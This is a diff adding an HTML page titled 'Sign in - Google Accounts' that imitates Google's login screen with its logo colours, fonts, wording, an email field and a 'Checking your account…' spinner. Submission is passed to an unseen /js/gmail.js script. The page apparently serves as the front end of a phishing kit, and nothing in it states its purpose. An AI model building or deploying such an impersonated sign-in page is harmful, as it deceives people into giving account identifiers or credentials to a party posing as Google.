@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in - Google Accounts</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/css/gmail.css" />
+</head>
+<body>
+  <div class="gmail-page">
+    <div class="gmail-card">
+      <div class="gmail-logo" aria-hidden="true">
+        <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+          <g>
+            <path fill="#4285F4" d="M9.24 8.19v2.46c1.96 0 3.55-1.6 3.55-3.55 0-.36-.05-.7-.14-1.03A3.54 3.54 0 0 0 9.24 8.19z"/>
+            <path fill="#34A853" d="M9.24 13.06v-2.46c1.96 0 3.55 1.6 3.55 3.55 0 .36-.05.7-.14 1.03-.96-.4-2.41-.86-3.41-2.12z"/>
+            <path fill="#FBBC05" d="M9.24 8.19c-1.96 0-3.55 1.6-3.55 3.55 0 .36.05.7.14 1.03.96-.4 2.41-.86 3.41-2.12V8.19z"/>
+            <path fill="#EA4335" d="M9.24 13.06c-1.96 0-3.55-1.6-3.55-3.55 0-.36.05-.7.14-1.03.96.4 2.41.86 3.41 2.12v2.46z"/>
+            <text x="20" y="18" font-family="Google Sans, Arial, sans-serif" font-size="14" font-weight="500" fill="#5F6368">Sign in</text>
+          </g>
+        </svg>
+      </div>
+
+      <h1 class="gmail-title">Sign in</h1>
+      <p class="gmail-subtitle">Use your Google Account</p>
+
+      <form id="gmail-email-form" class="gmail-form" autocomplete="off">
+        <div class="gmail-input-wrap">
+          <input type="email" id="gmail-email" name="email" placeholder=" " required autofocus />
+          <label for="gmail-email">Email or phone</label>
+        </div>
+        <div class="gmail-helper">Not your computer? Use Guest mode to sign in privately.</div>
+        <div class="gmail-actions">
+          <a href="/highlights" class="gmail-link">Create account</a>
+          <button type="submit" class="gmail-btn">Next</button>
+        </div>
+      </form>
+
+      <div id="gmail-loading" class="gmail-loading" style="display:none;">
+        <div class="gmail-spinner"></div>
+        <p>Checking your account…</p>
+      </div>
+    </div>
+
+    <footer class="gmail-footer">
+      <select class="gmail-lang">
+        <option>English (United States)</option>
+      </select>
+      <div class="gmail-footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+      </div>
+    </footer>
+  </div>
+
+  <script src="/js/gmail.js"></script>
+</body>
+</html>
